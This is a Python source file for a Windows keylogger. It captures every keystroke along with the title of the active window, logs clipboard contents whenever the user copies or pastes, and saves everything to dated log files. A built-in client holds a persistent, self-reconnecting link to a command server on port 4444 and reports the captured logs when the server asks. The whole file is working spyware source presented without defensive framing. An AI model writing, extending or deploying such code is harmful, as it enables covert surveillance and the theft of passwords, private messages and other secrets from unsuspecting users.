from win32gui import GetWindowText, GetForegroundWindow
from datetime import datetime
from pynput import keyboard
import win32clipboard
import threading
import socket
import json
import time
import os

LOGS_FOLDER = "./logs/"

KEYSTROKES = []
KEY_TIMEOUT = 3
LAST_KEYSTROKE = time.time()

class Client111(object):
    sock: socket.socket = None
    heartbeat_interval = 1

    def __init__(self, host: str, port: int, timeout: int = 10):
        self.host = host
        self.port = port
        self.timeout = timeout
    
    def start(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            self.sock = sock
            sock.connect((self.host, self.port))

            threading.Thread(target=self.handler, args=[sock], daemon=True).start()
            threading.Thread(target=self.heartbeat_handler, args=[sock], daemon=True).start()
        except Exception:
            time.sleep(1)
            return self.start()
        
    def handler(self, sock: socket.socket):
        try:
            while True:
                data = b""

                while True:
                    if not sock == self.sock:
                        raise Exception("New sock created.")
                    
                    chunk = sock.recv(1)

                    if not chunk:
                        raise Exception("Connection closed.")
                    
                    data += chunk

                    if data.endswith(b"\r\n\r\n"):
                        break
                
                self.on_data(sock=sock, data=json.loads(data))
        except Exception as e:
            print(f"Error: {e}")
            sock.close()
            time.sleep(1)
            return self.start()
    
    def heartbeat_handler(self, sock: socket.socket):
        try:
            sequence = 0

            while True:
                heartbeat_payload = {
                    "op": "PING",
                    "sequence": sequence
                }

                sequence += 1

                self.send_data(sock=sock, data=heartbeat_payload)

                time.sleep(1)
        except Exception:
            return
        
    def on_data(self, sock: socket.socket, data: dict):
        print(f"Data: {data}")

        if not "op" in data:
            raise Exception("Invalid data.")
        
        match data["op"]:
            case "COMMAND":
                if not "command" in data:
                    raise Exception("Invalid command data.")
                
                if not "request_id" in data:
                    raise Exception("Invalid command data.")
                
                self.on_command(sock=sock, data=data)

    def on_command(self, sock: socket.socket, data: dict):
        print(f"Command: {data}")
        request_id = data["request_id"]
        response = ""

        match data["command"]:
            case "logs":
                if not os.path.exists(LOGS_FOLDER):
                    response = "This client does not have LOGS_FOLDER."
                
                response = os.listdir(LOGS_FOLDER)
        
        response_data = {
            "op": "RESPONSE",
            "request_id": request_id,
            "response": response
        }

        self.send_data(sock=sock, data=response_data)

    def send_data(self, sock: socket.socket, data: dict):
        if not sock == self.sock:
            raise Exception("Invalid sock.")

        return sock.send(json.dumps(data).encode() + b"\r\n\r\n")

def log_text(text: str):
    filename = f"{datetime.now().strftime('%m-%d-%Y')}.txt"
    date = datetime.now().strftime("%H:%M:%S")

    active_window = GetWindowText(GetForegroundWindow())

    folder_path = os.path.abspath(LOGS_FOLDER)

    if os.path.isfile(folder_path):
        os.remove(folder_path)
        os.mkdir(folder_path)

    if not os.path.exists(folder_path):
        os.mkdir(folder_path)
    
    logfile_path = os.path.join(LOGS_FOLDER, filename)

    with open(logfile_path, "ab") as logfile:
        logfile.write(f"[{date}][{active_window}]\n{text}\n\n".encode())
        logfile.close()
    
    return

def keystrokes_log():
    keystrokes = "".join(KEYSTROKES)
    KEYSTROKES.clear()

    log_text(keystrokes)

def logger_handler():
    while True:
        time.sleep(0.05)

        if all([(time.time() - LAST_KEYSTROKE) >= KEY_TIMEOUT, KEYSTROKES]):
            keystrokes_log()

def on_clipboard_set():
    time.sleep(0.1)

    win32clipboard.OpenClipboard()
    data = win32clipboard.GetClipboardData()
    win32clipboard.CloseClipboard()

    log_text(f"Clipboard Set: ```{data}```")

def on_clipboard_pasted():
    time.sleep(0.1)

    win32clipboard.OpenClipboard()
    data = win32clipboard.GetClipboardData()
    win32clipboard.CloseClipboard()

    log_text(f"Clipboard Pasted: ```{data}```")

def on_press(key):
    global LAST_KEYSTROKE

    match type(key):
        case keyboard.Key:
            if key.name == "space":
                key_str = " "
            
            elif key.name in ["shift", "shift_r"]:
                return
            
            else:
                key_str = f"<{key.name}>"

        case keyboard.KeyCode:
            key_str = f"{key.char}"
        
    KEYSTROKES.append(key_str)
    LAST_KEYSTROKE = time.time()

    # Keys that will trigger functions
    match type(key):
        case keyboard.Key:
            if key.name == "enter":
                threading.Thread(target=keystrokes_log, daemon=True).start()
        
        case keyboard.KeyCode:
            if key.char == "\x03":
                threading.Thread(target=on_clipboard_set, daemon=True).start()
            
            elif key.char == "\x16":
                threading.Thread(target=on_clipboard_pasted, daemon=True).start()

def main():
    client111 = Client111(host="127.0.0.1", port=4444, timeout=10)
    threading.Thread(target=client111.start, daemon=True).start()
    threading.Thread(target=logger_handler, daemon=True).start()
    listener = keyboard.Listener(on_press=on_press)
    listener.run()

if __name__ == "__main__":
    main()
